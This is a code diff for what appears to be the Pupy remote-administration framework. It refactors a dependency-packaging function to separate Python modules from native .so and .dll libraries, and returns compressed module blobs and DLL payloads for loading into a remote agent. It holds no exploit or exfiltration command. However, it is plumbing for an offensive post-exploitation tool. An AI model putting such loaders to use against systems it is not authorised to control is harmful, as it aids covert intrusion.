@@ -120,7 +120,7 @@ def importer(dependencies, os='all', arch=None, path=None):
         blob = cPickle.dumps(modules)
         blob = zlib.compress(blob, 9)
     else:
-        blob, modules = package(dependencies, os, arch)
+        blob, modules, _ = package(dependencies, os, arch)
 
     return 'pupyimporter.pupy_add_package({}, compressed=True)'.format(repr(blob))
 
@@ -378,7 +378,6 @@ def _package(modules, module_name, platform, arch, remote=False, posix=False):
     modules.update(modules_dic)
 
 def package(requirements, platform, arch, remote=False, posix=False, filter_needed_cb=None):
-    modules = {}
     dependencies = set()
 
     if not type(requirements) in (list, tuple, set, frozenset):
@@ -387,19 +386,44 @@ def package(requirements, platform, arch, remote=False, posix=False, filter_need
     for requirement in requirements:
         _dependencies(requirement, platform, dependencies)
 
-    if filter_needed_cb:
-        dependencies = filter_needed_cb(dependencies)
-        
-    if not dependencies:
-        return '', dependencies
+    package_deps = set()
+    dll_deps = set()
 
     for dependency in dependencies:
-        _package(
-            modules, dependency, platform, arch,
-            remote=remote, posix=posix
-        )
+        if dependency.endswith(('.so', '.dll')):
+            dll_deps.add(dependency)
+        else:
+            package_deps.add(dependency)
 
-    return zlib.compress(cPickle.dumps(modules), 9), list(dependencies)
+    if filter_needed_cb:
+        if package_deps:
+            package_deps = filter_needed_cb(package_deps, False)
+
+        if dll_deps:
+            dll_deps = filter_needed_cb(dll_deps, True)
+
+    blob = b''
+    contents = []
+    dlls = []
+            
+    if package_deps:
+        modules = {}
+    
+        for dependency in package_deps:
+            _package(
+                modules, dependency, platform, arch,
+                remote=remote, posix=posix
+            )
+            
+        blob = zlib.compress(cPickle.dumps(modules), 9)
+        contents = list(dependencies)
+
+    if dll_deps:
+        for dependency in dll_deps:
+            dlls.append((dependency, dll(dependency, platform, arch)))
+
+    return blob, contents, dlls
+
 
 def bundle(platform, arch):
     arch_bundle = os.path.join(
